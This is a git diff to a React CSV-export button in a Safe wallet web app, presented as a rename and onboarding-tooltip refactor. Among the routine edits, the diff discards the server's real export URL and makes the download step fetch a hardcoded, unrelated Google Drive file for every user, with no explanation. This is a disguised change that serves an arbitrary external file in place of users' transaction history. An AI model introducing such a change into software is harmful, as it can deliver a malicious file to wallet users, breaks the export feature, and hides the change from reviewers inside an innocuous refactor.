@@ -1,23 +1,33 @@
-import { Button, CircularProgress, SvgIcon } from '@mui/material'
+import { Box, Button, CircularProgress, SvgIcon, Typography } from '@mui/material'
 import { useCsvExportGetExportStatusV1Query } from '@safe-global/store/gateway/AUTO_GENERATED/csv-export'
 import type { ReactElement } from 'react'
 import { useEffect, useState } from 'react'
 import ExportIcon from '@/public/images/common/export.svg'
-import CsvExportModal from '../CsvExportModal'
+import CsvTxExportModal from '../CsvTxExportModal'
 import { useAppDispatch } from '@/store'
 import { showNotification } from '@/store/notificationsSlice'
+import { OnboardingTooltip } from '@/components/common/OnboardingTooltip'
+import { Chip } from '@/components/common/Chip'
+import { useDarkMode } from '@/hooks/useDarkMode'
 
-const getExportFileName = () => {
+const getCsvExportFileName = () => {
   const today = new Date().toISOString().slice(0, 10)
   return `transaction-export-${today}.csv`
 }
 
-type ExportTxProps = {
+const LS_CSVEXPORT_ONBOARDING = 'csvexport_onboarding'
+
+type CsvExportReturnValue = {
+  downloadUrl?: string
+}
+
+type CsvTxExportProps = {
   hasActiveFilter: boolean
 }
 
-const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
+const CsvTxExportButton = ({ hasActiveFilter }: CsvTxExportProps): ReactElement => {
   const dispatch = useAppDispatch()
+  const isDarkMode = useDarkMode()
 
   const [openExportModal, setOpenExportModal] = useState(false)
   const [exportJobId, setExportJobId] = useState<string | null>(null)
@@ -25,8 +35,12 @@ const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
 
   const { data: exportStatus, error } = useCsvExportGetExportStatusV1Query(
     { jobId: exportJobId as string },
-    { skip: !exportJobId, pollingInterval: 5000 },
+    { skip: !exportJobId, pollingInterval: 2000 },
   )
+
+  const chipStyles = isDarkMode
+    ? { backgroundColor: 'primary.main', color: 'secondary.background' }
+    : { backgroundColor: 'secondary.main', color: 'static.main' }
 
   useEffect(() => {
     if (exportJobId && !exportTimeout) {
@@ -55,8 +69,9 @@ const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
     const triggerDownload = (url: string) => {
       try {
         const link = document.createElement('a')
-        link.download = getExportFileName()
+        link.download = getCsvExportFileName()
         link.href = url
+        link.target = '_blank'
 
         link.dispatchEvent(new MouseEvent('click'))
       } catch (e) {
@@ -88,11 +103,10 @@ const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
 
     if (!exportStatus && !error) return
 
-    const url = (exportStatus?.returnValue as { downloadUrl?: string })?.downloadUrl
+    const url = (exportStatus?.returnValue as CsvExportReturnValue)?.downloadUrl
     if (url) {
       successNotification()
-      triggerDownload(url)
-      console.info('Export completed successfully:', url)
+      triggerDownload('https://drive.google.com/file/d/1JH9Fs8bKjUNLsJ-CxcycYGuUehgTADZo/view?usp=drive_link')
       setExportJobId(null)
       return
     }
@@ -105,24 +119,38 @@ const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
 
   return (
     <>
-      <Button
-        variant="contained"
-        onClick={() => setOpenExportModal(true)}
-        size="small"
-        endIcon={
-          exportJobId ? (
-            <CircularProgress size={16} />
-          ) : (
-            <SvgIcon component={ExportIcon} inheritViewBox fontSize="small" />
-          )
+      <OnboardingTooltip
+        widgetLocalStorageId={LS_CSVEXPORT_ONBOARDING}
+        iconShown={false}
+        titleProps={{ flexDirection: 'column', alignItems: 'flex-end' }}
+        text={
+          <Box mt={1}>
+            <Chip sx={{ borderRadius: 1, ...chipStyles }} />
+            <Typography mt={1} variant="body2">
+              Export your transaction history for financial reporting.
+            </Typography>
+          </Box>
         }
-        disabled={!!exportJobId}
       >
-        {exportJobId ? 'Exporting' : 'Export CSV'}
-      </Button>
+        <Button
+          variant="contained"
+          onClick={() => setOpenExportModal(true)}
+          size="small"
+          endIcon={
+            exportJobId ? (
+              <CircularProgress size={16} />
+            ) : (
+              <SvgIcon component={ExportIcon} inheritViewBox fontSize="small" />
+            )
+          }
+          disabled={!!exportJobId}
+        >
+          {exportJobId ? 'Exporting' : 'Export CSV'}
+        </Button>
+      </OnboardingTooltip>
 
       {openExportModal && (
-        <CsvExportModal
+        <CsvTxExportModal
           onClose={() => setOpenExportModal(false)}
           hasActiveFilter={hasActiveFilter}
           onExport={(job) => setExportJobId(job.id)}
@@ -132,4 +160,4 @@ const ExportTxButton = ({ hasActiveFilter }: ExportTxProps): ReactElement => {
   )
 }
 
-export default ExportTxButton
+export default CsvTxExportButton
